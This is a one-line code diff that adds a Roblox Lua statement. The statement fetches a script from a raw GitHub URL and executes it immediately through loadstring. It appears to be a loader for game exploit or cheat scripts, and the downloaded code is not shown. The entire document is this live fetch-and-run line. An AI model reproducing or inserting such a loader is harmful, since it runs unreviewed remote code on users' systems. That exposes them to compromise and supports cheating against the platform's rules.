@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VenomScriptsV/ts/main/0.1", true))()
